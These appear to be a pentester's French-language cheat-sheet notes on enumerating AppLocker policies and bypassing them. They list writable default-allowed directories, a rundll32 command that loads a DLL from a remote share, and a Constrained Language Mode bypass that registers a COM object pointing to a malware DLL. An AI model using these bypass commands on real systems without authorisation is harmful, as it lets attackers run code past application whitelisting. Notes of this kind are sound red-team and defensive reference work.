
- [[#Enumeration]]
- [[#Bypasses]]

---
# Enumeration

## Localement

 Check des règles Applocker Local

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Powershell CLM

```
$ExecutionContext.SessionState.LanguageMode
```

 Test Applocker policy Local

```powershell
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

## Remote (GPO)

 Identifier les règles AppLocker en remote au travers des GPO

```
ldapsearch (objectClass=groupPolicyContainer) --attributes displayName,gPCFileSysPath

ls <gPCFileSysPath>\Machine
```

Télécharger registry.pol

```
download \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}\Machine\Registry.pol
```

Lire le fichier

```
Parse-PolFile -Path .\Desktop\Registry.pol
```


---
# Bypasses

- [[#Writable directories]]
- [[#LOLBAS]]
- [[#Powershell CLM]]

## Writable directories

Par défaut les dossiers suivants ne sont pas bloqués par Applocker:

- C:\Windows\Tasks
    
- C:\Windows\Temp 
    
- C:\windows\tracing
    
- C:\Windows\System32\spool\PRINTERS
    
- C:\Windows\System32\spool\SERVERS
    
- C:\Windows\System32\spool\drivers\color


Identifier les droits sur les dossiers et si possible d'écrire y placer notre exécutable.

```powershell
icacls 'C:\Windows\Tasks'
```


## LOLBAS

Possible de bypass avec les lolbas qui sont lancés depuis C:\Windows

https://lolbas-project.github.io/#/execute
https://lolbas-project.github.io/#/awl

```
rundll32.exe \\servername\C$\Windows\Temp\file.dll,0
```


## Powershell CLM

Constrained Language Mode qui restreint l'invocation des API Windows en powershell.

Possible de Bypass en chargeant un COM object.

1. Créer un COM object

```powershell
$GUID=[System.Guid]::NewGuid()
$Tintin="Path\to\malware.dll"

New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{$GUID}"
New-Item -Path "HKCU:Software\Classes\CLSID\{$GUID}" -Name "InprocServer32" -Value "$Tintin"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{$GUID}\InprocServer32" -Name "ThreadingModel" -Value "Both"
New-Item -Path "HKCU:Software\Classes" -Name "Tre.Genti" -Value "TintinAuCongo"
New-Item -Path "HKCU:Software\Classes\Tre.Genti" -Name "CLSID" -Value "{$GUID}"
```

2. Exécuter le COM Object.

```powershell
New-Object -ComObject Tre.Genti
```

